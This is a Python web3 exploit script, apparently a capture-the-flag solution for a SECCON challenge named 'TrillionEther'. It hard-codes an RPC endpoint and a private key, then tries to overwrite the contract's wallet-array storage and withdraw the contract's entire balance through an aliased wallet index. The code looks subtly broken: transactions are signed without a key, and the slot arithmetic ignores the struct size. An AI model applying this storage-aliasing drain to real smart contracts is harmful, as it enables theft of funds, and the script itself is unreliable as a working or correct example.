from web3 import Web3
import sys

# 与えられた情報を設定
rpc_endpoint = 'http://trillion-ether.seccon.games:8545/7bf0f903-6dbe-4f85-a4c7-98539240eafb'
private_key = '9fc1877eb1ccbb8f07e20e947e86aaa72c9d3038ece96013bc133a890af90983'
challenge_contract_address = '0xe440C406f9ce143177d2e5858E283F52f9b06902'

# コントラクトのABI
abi = [
    {
        "inputs": [],
        "stateMutability": "payable",
        "type": "constructor"
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "bytes32",
                "name": "name",
                "type": "bytes32"
            }
        ],
        "name": "createWallet",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "uint256",
                "name": "fromWalletId",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "toWalletId",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "uint256",
                "name": "walletId",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "withdraw",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "wallets",
        "outputs": [
            {
                "components": [
                    {
                        "internalType": "bytes32",
                        "name": "name",
                        "type": "bytes32"
                    },
                    {
                        "internalType": "uint256",
                        "name": "balance",
                        "type": "uint256"
                    },
                    {
                        "internalType": "address",
                        "name": "owner",
                        "type": "address"
                    }
                ],
                "internalType": "struct TrillionEther.Wallet[]",
                "name": "",
                "type": "tuple[]"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
]

# Web3の初期化
w3 = Web3(Web3.HTTPProvider(rpc_endpoint))
account = w3.eth.account.from_key(private_key)

contract = w3.eth.contract(address=challenge_contract_address, abi=abi)

def exploit():
    # ステップ1: wallets配列の長さを上書き
    large_number = 2 ** 256 - 1  # ストレージスロット0を最大値に設定
    tx = contract.functions.createWallet(large_number.to_bytes(32, 'big')).build_transaction({
        'from': account.address,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': 100000,
        'gasPrice': w3.to_wei('1', 'gwei'),
        'value': 0
    })
    signed_tx = w3.eth.account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    w3.eth.wait_for_transaction_receipt(tx_hash)
    print("Step 1: Overwrote wallets array length.")

    # ステップ2: コントラクトの残高を自分のウォレットに設定
    # ストレージスロットを計算
    contract_balance_slot = 1  # コントラクトの残高が格納されるストレージスロット

    # walletsの開始位置を計算
    wallets_base_slot = int.from_bytes(Web3.keccak(b'\x00'), 'big')

    # 対象のwallet_idを計算
    wallet_id = (contract_balance_slot - wallets_base_slot) % (2 ** 256)

    # コントラクトの残高を取得
    contract_balance = w3.eth.get_balance(challenge_contract_address)
    tx = contract.functions.withdraw(wallet_id, contract_balance).build_transaction({
        'from': account.address,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': 100000,
        'gasPrice': w3.to_wei('1', 'gwei'),
    })
    signed_tx = w3.eth.account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    w3.eth.wait_for_transaction_receipt(tx_hash)
    print("Step 2: Withdrew contract balance.")

    # ステップ3: isSolved()を確認
    solved = contract.functions.isSolved().call()
    print(f"Step 3: isSolved() = {solved}")

if __name__ == '__main__':
    exploit()

